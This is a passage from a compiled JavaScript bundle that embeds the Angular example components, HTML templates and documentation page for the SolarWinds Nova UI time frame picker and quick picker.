granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _find from "lodash/find";\nimport _isUndefined from "lodash/isUndefined";\nimport moment, { Moment } from "moment/moment";\nimport { Subject } from "rxjs";\n\nimport { IQuickPickPresetDictionary } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-frame-picker-date",\n    templateUrl: "./time-frame-picker-date.example.component.html",\n})\nexport class TimeFramePickerDateExampleComponent {\n    public presets: IQuickPickPresetDictionary;\n    public selectedPresetKey = "ihorsBirthday";\n    public selectedDate: Moment;\n\n    public showFooter: boolean = true;\n\n    constructor() {\n        this.presets = this.getDefaultPresets();\n        this.selectedDate = this.getDateFromPreset(this.selectedPresetKey);\n    }\n\n    public closePopoverSubject = new Subject<void>();\n\n    public handlePresetSelection(presetKey: string): void {\n        this.selectedDate = this.getDateFromPreset(presetKey);\n        this.selectedPresetKey = presetKey;\n        this.confirmPopover();\n    }\n\n    public dateChanged(value: Moment): void {\n        if (!this.selectedDate.isSame(value, "day")) {\n            this.selectedDate = value;\n            this.selectedPresetKey = this.getPresetFromDate(value); // will return undefined if not found, exactly what\'s needed\n            this.confirmPopover();\n        }\n    }\n\n    public confirmPopover(): void {\n        this.closePopoverSubject.next();\n    }\n\n    // These private methods are specific and will be in any case abstracted to a service by end users:\n\n    private getDefaultPresets(): { [key: string]: any } {\n        return {\n            today: { name: "Today", pattern: () => moment() },\n            yesterday: {\n                name: "Yesterday",\n                pattern: () => moment().subtract(1, "days"),\n            },\n            ihorsBirthday: {\n                name: "Ihor\'s Birthday",\n                pattern: () => moment("1989-04-09"),\n            },\n            random: {\n                name: "Random date (to show that we can)",\n                pattern: () =>\n                    moment(\n                        +new Date() - Math.floor(Math.random() * 100000000000)\n                    ),\n            },\n        };\n    }\n\n    private getDateFromPreset(presetKey: string): Moment {\n        const preset = this.getDefaultPresets()[presetKey];\n        return preset ? preset.pattern() : moment();\n    }\n\n    private getPresetFromDate(date: Moment): string {\n        const preset: string | undefined = _find(\n            Object.keys(this.presets),\n            (key) => date.isSame(this.getDateFromPreset(key), "day")\n        );\n        if (_isUndefined(preset)) {\n            throw new Error("DatePreset was not found");\n        }\n        return preset;\n    }\n}\n'},96051:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiTimeFramePickerModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<p>\n    The <code>&lt;nui-time-frame-picker&gt;</code> component allows the user to\n    select a time range. Its model is an\n    <code\n        ><a href="../interfaces/ITimeframe.html" target="_blank"\n            >ITimeframe</a\n        ></code\n    >\n    which can be set using the <code>startModel</code> input. All changes can be\n    detected using the <code>changed</code> output. Additionally, max and min\n    dates can be defined by setting the <code>maxDate</code> and\n    <code>minDate</code> inputs with moment instances.\n</p>\n<p>\n    If the user selects a start time that\'s later than the currently selected\n    end time, the selected end time will adjust accordingly to preserve the\n    current timeframe duration.\n</p>\n<p>\n    If the user attempts to select an end time that\'s the same as or earlier\n    than the currently selected start time, no changes occur on either the view\n    or the model.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="time-frame-picker-inline"\n    exampleTitle="Basic Usage"\n>\n    <nui-time-frame-picker-inline></nui-time-frame-picker-inline>\n</nui-example-wrapper>\n\n<h2>Quick Picker Component</h2>\n\n<p>\n    The <code>&lt;nui-quick-picker&gt;</code> component is a helper component in\n    the TimeFramePicker module.\n</p>\n<p>\n    In most cases, the default title "Quick Picks" on the left pane should be\n    sufficient; however, if needed, the title can be customized using the\n    <code>presetsTitle</code> input.\n</p>\n<p>\n    If a custom ordering of presets is needed, an array of keys can be passed to\n    the <code>presetKeysOrder</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="quick-picker-basic"\n    exampleTitle="Quick Picker"\n>\n    <nui-quick-picker-basic></nui-quick-picker-basic>\n</nui-example-wrapper>\n\n<h2>Timeframe Picker in a Popover</h2>\n\n<p>\n    To implement the common use-case of a timeframe picker in a popover, combine\n    the <code>&lt;nui-time-frame-picker&gt;</code>,\n    <code>nui-quick-picker</code> and <code>nui-popover</code> elements as shown\n    below.\n</p>\n<p>\n    To achieve a modal effect, you can set the popover\'s\n    <code>[modal]</code> input to <code>true</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-frame-picker-basic"\n    exampleTitle="Timeframe Picker in a Popover"\n>\n    <nui-time-frame-picker-basic-example></nui-time-frame-picker-basic-example>\n</nui-example-wrapper>\n\n<h2>Date-Based Picker in Popover</h2>\n\n<nui-message type="info" [allowDismiss]="false">\n    Please note that in order to adjust popover to the width of inner components\n    you may need to pass <code>[unlimited]="true"</code> to it.\n</nui-message>\n<p>\n    You are free to use different types of components inside a Quick Picker. The\n    following example shows how to put a DatePicker inside.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="time-frame-picker-date"\n    exampleTitle="Date-Based Picker in Popover"\n>\n    <nui-time-frame-picker-date></nui-time-frame-picker-date>\n</nui-example-wrapper>\n\n<h2>Custom presets with Timeframe Picker</h2>\n\n<p>\n    Presets can be changed using\n    <code>timeframeService.currentPresets</code> field.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    Please note that TimeFrameService is provided in scope of\n    NuiTimeFramePickerModule once, and since one TimeFrameService instance can\n    keep only one set of presets, in order to have different presets in 2\n    different components of an application, please provide different\n    TimeFrameService instances in scope of those components (as in the example\n    below, which includes <code>providers: [TimeframeService]</code> in a\n    component decorator).\n</nui-message>\n\n<nui-example-wrapper\n    filenamePrefix="time-frame-picker-custom"\n    exampleTitle="Date-Based Picker in Popover"\n>\n    <nui-time-frame-picker-custom></nui-time-frame-picker-custom>\n</nui-example-wrapper>\n\n<h2>Multiple pickers with custom presets</h2>\n<p>\n    If you want to have multiple instances of <code>TimeFrameService</code> for\n    your time frame pickers, you should provide one in the components providers.\n</p>\n<p>\n    The example below shows how to create a component that will be responsible\n    for creating <code>TimeFrameService</code> per component.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-frame-picker-multiple-custom-pickers"\n    exampleTitle="Multiple pickers with custom presets"\n>\n    <nui-time-frame-picker-multiple-custom-pickers></nui-time-frame-picker-multiple-custom-pickers>\n</nui-example-wrapper>\n'},13771:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-time-frame-picker-docs",\n    templateUrl: "./time-frame-picker-docs.example.component.html",\n})\nexport class TimeFramePickerDocsExampleComponent {}\n'},93755:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-frame-picker\n    [startModel]="tf"\n    (changed)="updateTf($event)"\n    [maxDate]="maxDate"\n    [minDate]="minDate"\n>\n</nui-time-frame-picker>\n\n<span class="nui-text-secondary"\n    >Selected timeframe is {{ tf | timeFrame }}</span\n>\n'},18595:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment from "moment/moment";\n\nimport { ITimeframe } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-frame-picker-inline",\n    templateUrl: "./time-frame-picker-inline.example.component.html",\n})\nexport class TimeFramePickerInlineExampleComponent {\n    public tf: ITimeframe = {\n        startDatetime: moment("04/09/2018", "L"),\n        endDatetime: moment("04/10/2018", "L"),\n        // @ts-ignore\n        selectedPresetId: null,\n    };\n\n    public minDate = moment("04/07/2018", "L"); // "L" is "MM/DD/YYY" in moment.js\n    public maxDate = moment();\n\n    public updateTf(value: any): void {\n        this.tf = value;\n    }\n}\n'},17221:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex" *ngFor="let picker of pickers; let index = index">\n    <nui-time-frame-service-scoper #scoper>\n        <nui-popover\n            trigger="click"\n            [template]="popoverTimeFramePicker"\n            [hasPadding]="false"\n            [closePopover]="closePopoverSubject"\n            [modal]="true"\n            ><span class="nui-text-link" style="cursor: pointer">{{\n                picker.acceptedTimeframe | timeFrame\n            }}</span>\n        </nui-popover>\n\n        <ng-template #popoverTimeFramePicker>\n            <div>\n                <nui-quick-picker\n                    [presets]="picker.presets"\n                    [selectedPreset]="picker.acceptedTimeframe.selectedPresetId"\n                    (presetSelected)="handlePresetSelection($event, index)"\n                    pickerTitle="Custom Range"\n                    i18n-pickerTitle\n                >\n                    <nui-time-frame-picker\n                        [startModel]="picker.acceptedTimeframe"\n                        (changed)="updateTf($event, index)"\n                    ></nui-time-frame-picker>\n                </nui-quick-picker>\n            </div>\n            <nui-dialog-footer *ngIf="showFooter">\n                <button\n                    nui-button\n                    type="button"\n                    displayStyle="action"\n                    class="pr-3 nui-time-frame-picker__cancel"\n                    (click)="cancelPopover(index)"\n                    i18n\n                >\n                    Cancel\n                </button>\n                <button\n                    nui-button\n                    type="button"\n                    displayStyle="primary"\n                    class="nui-time-frame-picker__use"\n                    (click)="confirmPopover(index)"\n                    i18n\n                >\n                    Use\n                </button>\n            </nui-dialog-footer>\n        </ng-template>\n    </nui-time-frame-service-scoper>\n</div>\n'},87361:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectorRef,\n    Component,\n    QueryList,\n    ViewChildren,\n} from "@angular/core";\nimport { Subject } from "rxjs";\n\nimport {\n    ITimeframe,\n    ITimeFramePresetDictionary,\n    TimeframeService,\n} from "@nova-ui/bits";\n\ninterface IPicker {\n    id: string;\n    presets: ITimeFramePresetDictionary;\n    timeframeService?: TimeframeService;\n    tf?: ITimeframe;\n    acceptedTimeframe?: ITimeframe;\n    selectedPresetKey: string;\n}\n\n@Component({\n    selector: "nui-time-frame-picker-multiple-custom-pickers",\n    templateUrl:\n        "./time-frame-picker-multiple-custom-pickers.example.component.html",\n})\nexport class TimeFramePickerMultipleCustomPickersExampleComponent\n    implements AfterViewInit\n{\n    @ViewChildren("scoper")\n    private tfScopers: QueryList<TimeframeServiceScoperExampleComponent>;\n\n    public pickers: IPicker[] = [\n        {\n            id: "1",\n            presets: {\n                last42Hours: {\n                    name: $localize`Last 42 hours`,\n                    startDatetimePattern: { hours: -42 },\n                    endDatetimePattern: {},\n                },\n                last749Days: {\n                    name: $localize`Last 749 days`,\n                    startDatetimePattern: { days: -749 },\n                    endDatetimePattern: {},\n                },\n            },\n            selectedPresetKey: "last749Days",\n        },\n        {\n            id: "2",\n            presets: {\n                last42Hours: {\n                    name: $localize`Last 42 hours`,\n                    startDatetimePattern: { hours: -42 },\n                    endDatetimePattern: {},\n                },\n            },\n            selectedPresetKey: "last42Hours",\n        },\n        {\n            id: "3",\n            presets: {\n                lastYear: {\n                    name: $localize`Last year`,\n                    startDatetimePattern: { year: -1 },\n                    endDatetimePattern: {},\n                },\n                last10Years: {\n                    name: $localize`Last 10 years`,\n                    startDatetimePattern: { year: -10 },\n                    endDatetimePattern: {},\n                },\n            },\n            selectedPresetKey: "lastYear",\n        },\n    ];\n\n    public presets: ITimeFramePresetDictionary = {\n        last42Hours: {\n            name: $localize`Last 42 hours`,\n            startDatetimePattern: { hours: -42 },\n            endDatetimePattern: {},\n        },\n        last749Days: {\n            name: $localize`Last 749 days`,\n            startDatetimePattern: { days: -749 },\n            endDatetimePattern: {},\n        },\n    };\n\n    public showFooter: boolean = false;\n\n    public closePopoverSubject = new Subject<void>();\n    public openPopoverSubject = new Subject<void>();\n\n    constructor(private cdRef: ChangeDetectorRef) {}\n\n    public updateTf(value: ITimeframe, index: number): void {\n        const picker = this.pickers[index];\n        picker.tf = value;\n\n        const timeFrameDatesValid = () =>\n            picker.timeframeService?.areTimeFrameDatesValid(value);\n        const timeFrameDatesEqual = () =>\n            picker.timeframeService?.isEqual(\n                <ITimeframe>picker.tf,\n                <ITimeframe>picker.acceptedTimeframe\n            );\n        if (timeFrameDatesValid() && !timeFrameDatesEqual()) {\n            this.showFooter = true;\n        }\n\n        picker.selectedPresetKey = <string>picker.tf.selectedPresetId;\n    }\n\n    public ngAfterViewInit(): void {\n        this.tfScopers.forEach((scoper, i) => {\n            const picker = this.pickers[i];\n            const timeframeService = scoper.timeframeService;\n\n            picker.timeframeService = timeframeService;\n            timeframeService.currentPresets = picker.presets;\n            picker.acceptedTimeframe = timeframeService.getTimeframeByPresetId(\n                picker.selectedPresetKey\n            );\n            picker.tf = picker.acceptedTimeframe;\n        });\n        this.cdRef.detectChanges();\n    }\n\n    public confirmPopover(index: number): void {\n        const picker = this.pickers[index];\n\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n        picker.acceptedTimeframe = picker.tf;\n    }\n\n    public cancelPopover(index: number): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n    }\n\n    public handlePresetSelection(presetKey: string, index: number): void {\n        const picker = this.pickers[index];\n\n        picker.selectedPresetKey = presetKey;\n        picker.tf = picker.timeframeService?.getTimeframeByPresetId(presetKey);\n        picker.acceptedTimeframe = picker.tf;\n        this.closePopoverSubject.next();\n    }\n}\n\n@Component({\n    selector: "nui-time-frame-service-scoper",\n    providers: [TimeframeService],\n    template: `<ng-content></ng-content>`,\n})\nexport class TimeframeServiceScoperExampleComponent {\n    constructor(public timeframeService: TimeframeService) {}\n}\n'},75553:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    id="nui-demo-basic-time-frame-picker"\n    trigger="click"\n    [template]="popoverTimeFramePicker"\n    [hasPadding]="false"\n    [closePopover]="closePopoverSubject"\n>\n    <span class="nui-text-link" style="cursor: pointer">{{\n        acceptedTimeframe | timeFrame\n    }}</span>\n</nui-popover>\n\n<div>{{ acceptedTimeframe | timeFrame : "LL LTS" }}</div>\n\n<ng-template #popoverTimeFramePicker>\n    <div>\n        <nui-quick-picker\n            [presets]="presets"\n            [selectedPreset]="acceptedTimeframe.selectedPresetId"\n            (presetSelected)="handlePresetSelection($event)"\n            pickerTitle="Custom Range"\n            i18n-pickerTitle\n        >\n            <nui-time-frame-picker\n                [startModel]="acceptedTimeframe"\n                (changed)="updateTf($event)"\n                [maxDate]="maxDate"\n                [minDate]="minDate"\n            >\n            </nui-time-frame-picker>\n        </nui-quick-picker>\n    </div>\n    <nui-dialog-footer *ngIf="showFooter">\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            class="pr-3 nui-time-frame-picker__cancel"\n            (click)="cancelPopover()"\n            id="nui-demo-basic-time-frame-picker-cancel"\n            i18n\n        >\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            class="nui-time-frame-picker__use"\n            (click)="confirmPopover()"\n            id="nui-demo-basic-time-frame-picker-use"\n            i18n\n        >\n            Use\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n'},53069:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment from "moment/moment";\nimport { Subject } from "rxjs";\n\nimport {\n    ITimeframe,\n    ITimeFramePresetDictionary,\n    TimeframeService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-frame-picker-test",\n    templateUrl: "./time-frame-picker-test.example.component.html",\n})\nexport class TimeFramePickerTestExampleComponent {\n    public presets: ITimeFramePresetDictionary;\n    public selectedPresetKey?: string = "lastHour";\n    public acceptedTimeframe: ITimeframe;\n    public tf: ITimeframe;\n\n    public minDate = moment("04/07/2018", "L"); // "L" is "MM/DD/YYY" in moment.js\n    public maxDate = moment();\n\n    public showFooter: boolean = false;\n\n    constructor(public timeframeService: TimeframeService) {\n        this.presets = timeframeService.getDefaultPresets();\n        this.acceptedTimeframe = this.timeframeService.getTimeframeByPresetId(\n            this.selectedPresetKey\n        );\n        this.tf = this.acceptedTimeframe;\n    }\n\n    public closePopoverSubject = new Subject<void>();\n    public openPopoverSubject = new Subject<void>();\n\n    public updateTf(value: ITimeframe): void {\n        this.tf = value;\n        const timeFrameDatesValid = () =>\n            this.timeframeService.areTimeFrameDatesValid(value);\n        const timeFrameDatesEqual = () =>\n            this.timeframeService.isEqual(this.tf, this.acceptedTimeframe);\n        if (timeFrameDatesValid() && !timeFrameDatesEqual()) {\n            this.showFooter = true;\n        }\n\n        this.selectedPresetKey = this.tf.selectedPresetId;\n    }\n\n    public confirmPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n        this.acceptedTimeframe = this.tf;\n    }\n\n    public cancelPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n    }\n\n    public handlePresetSelection(presetKey: string): void {\n        this.selectedPresetKey = presetKey;\n        this.tf = this.timeframeService.getTimeframeByPresetId(presetKey);\n        this.acceptedTimeframe = this.tf;\n        this.closePopoverSubject.next();\n    }\n}\n'},52793:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h4>TimeFrame Picker in Popover</h4>\n            <nui-popover\n                trigger="click"\n                [template]="popoverTimeFramePicker"\n                [hasPadding]="false"\n                [closePopover]="closePopoverSubject"\n                [modal]="true"\n                id="nui-demo-visual-default-popover"\n            >\n                <span class="nui-text-link" style="cursor: pointer">{{\n                    acceptedTimeframe | timeFrame\n                }}</span>\n            </nui-popover>\n\n            <ng-template #popoverTimeFramePicker>\n                <div>\n                    <nui-quick-picker\n                        [presets]="presets"\n                        [selectedPreset]="acceptedTimeframe.selectedPresetId"\n                        (presetSelected)="handlePresetSelection($event)"\n                        pickerTitle="Custom Range"\n                    >\n                        <nui-time-frame-picker\n                            [startModel]="acceptedTimeframe"\n                            (changed)="updateTf($event)"\n                        >\n                        </nui-time-frame-picker>\n                    </nui-quick-picker>\n                </div>\n                <nui-dialog-footer *ngIf="showFooter">\n                    <button\n                        nui-button\n                        type="button"\n                        displayStyle="action"\n                        class="pr-3 nui-time-frame-picker__cancel"\n                        (click)="cancelPopover()"\n                    >\n                        Cancel\n                    </button>\n                    <button\n                        nui-button\n                        type="button"\n                        displayStyle="primary"\n                        class="nui-time-frame-picker__use"\n                        (click)="confirmPopover()"\n                    >\n                        Use\n                    </button>\n                </nui-dialog-footer>\n            </ng-template>\n        </div>\n        <div class="col">\n            <h4>TimeFrame Picker with other components</h4>\n            <nui-popover\n                trigger="click"\n                [template]="popoverDayPicker"\n                [hasPadding]="false"\n                [closePopover]="closePopoverSubject"\n                [unlimited]="true"\n                [modal]="true"\n                id="nui-demo-visual-datepicker-popover"\n            >\n                <span class="nui-text-link" style="cursor: pointer"\n                    >Select day</span\n                >\n            </nui-popover>\n\n            <p>\n                Selected date:\n                <em>{{ selectedDate?.format("MMMM Do, YYYY") }}</em>\n            </p>\n\n            <ng-template #popoverDayPicker>\n                <div>\n                    <nui-quick-picker\n                        [presets]="presetsDatePicker"\n                        [selectedPreset]="selectedPresetKeyDatePicker"\n                        (presetSelected)="\n                            handlePresetSelectionDatePicker($event)\n                        "\n                        pickerTitle="Custom Date"\n                        presetsTitle="Baselines"\n                    >\n                        <nui-date-picker\n                            [inline]="true"\n                            [value]="selectedDate"\n                            [preserveInsignificant]="false"\n                            (valueChange)="dateChanged($event)"\n                        >\n                        </nui-date-picker>\n                    </nui-quick-picker>\n                </div>\n            </ng-template>\n        </div>\n        <div class="col">\n            <h4>\n                TimeFrame Picker + Date picker with unlimited width in Popover\n            </h4>\n            <nui-popover\n                trigger="click"\n                [template]="popoverTimeFramePickerUnlimited"\n                [hasPadding]="false"\n                [closePopover]="closePopoverSubject"\n                [modal]="true"\n                [unlimited]="true"\n                id="nui-demo-visual-complex-popover"\n            >\n                <span class="nui-text-link" style="cursor: pointer">{{\n                    acceptedTimeframe | timeFrame\n                }}</span>\n            </nui-popover>\n\n            <ng-template #popoverTimeFramePickerUnlimited>\n                <div>\n                    <nui-quick-picker\n                        [presets]="presets"\n                        [selectedPreset]="acceptedTimeframe.selectedPresetId"\n                        (presetSelected)="handlePresetSelection($event)"\n                        pickerTitle="Custom Range"\n                    >\n                        <nui-time-frame-picker\n                            [startModel]="acceptedTimeframe"\n                            (changed)="updateTf($event)"\n                        >\n                        </nui-time-frame-picker>\n                        <nui-date-picker\n                            [inline]="true"\n                            [value]="selectedDate"\n                            [preserveInsignificant]="false"\n                            (valueChange)="dateChanged($event)"\n                        >\n                        </nui-date-picker>\n                    </nui-quick-picker>\n                </div>\n            </ng-template>\n        </div>\n    </div>\n</div>\n'},96725:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _find from "lodash/find";\nimport _isUndefined from "lodash/isUndefined";\nimport moment, { Moment } from "moment/moment";\nimport { Subject } from "rxjs";\n\nimport {\n    IQuickPickPresetDictionary,\n    ITimeframe,\n    ITimeFramePresetDictionary,\n    TimeframeService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-frame-picker-visual-test",\n    templateUrl: "./time-frame-picker-visual-test.component.html",\n})\nexport class TimeFramePickerVisualTestComponent {\n    public presets: ITimeFramePresetDictionary;\n    public presetsDatePicker: IQuickPickPresetDictionary;\n    public selectedPresetKey?: string = "lastHour";\n    public selectedPresetKeyDatePicker = "dimasBirthday";\n    public acceptedTimeframe: ITimeframe;\n    public tf: ITimeframe;\n    public selectedDate: Moment;\n\n    public showFooter: boolean = false;\n\n    constructor(public timeframeService: TimeframeService) {\n        this.presets = timeframeService.getDefaultPresets();\n        this.acceptedTimeframe = this.timeframeService.getTimeframeByPresetId(\n            this.selectedPresetKey,\n            "02/17/1986"\n        );\n        this.tf = this.acceptedTimeframe;\n        this.presetsDatePicker = this.getDefaultPresets();\n        this.selectedDate = this.getDateFromPreset(\n            this.selectedPresetKeyDatePicker\n        );\n    }\n\n    public closePopoverSubject = new Subject<void>();\n    public openPopoverSubject = new Subject<void>();\n\n    public updateTf(value: ITimeframe): void {\n        this.tf = value;\n        const timeFrameDatesValid = () =>\n            this.timeframeService.areTimeFrameDatesValid(value);\n        const timeFrameDatesEqual = () =>\n            this.timeframeService.isEqual(this.tf, this.acceptedTimeframe);\n        if (timeFrameDatesValid() && !timeFrameDatesEqual()) {\n            this.showFooter = true;\n        }\n        this.selectedPresetKey = this.tf.selectedPresetId;\n    }\n\n    public confirmPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n        this.acceptedTimeframe = this.tf;\n    }\n\n    public cancelPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n    }\n\n    public handlePresetSelection(presetKey: string): void {\n        this.selectedPresetKeyDatePicker = presetKey;\n        this.tf = this.timeframeService.getTimeframeByPresetId(\n            presetKey,\n            "02/17/1986"\n        );\n        this.acceptedTimeframe = this.tf;\n        this.closePopoverSubject.next();\n    }\n\n    public confirmPopoverDatePicker(): void {\n        this.closePopoverSubject.next();\n    }\n\n    public handlePresetSelectionDatePicker(presetKey: string): void {\n        this.selectedDate = this.getDateFromPreset(presetKey);\n        this.selectedPresetKeyDatePicker = presetKey;\n        this.confirmPopoverDatePicker();\n    }\n\n    public dateChanged(value: Moment): void {\n        if (!this.selectedDate.isSame(value, "day")) {\n            this.selectedDate = value;\n            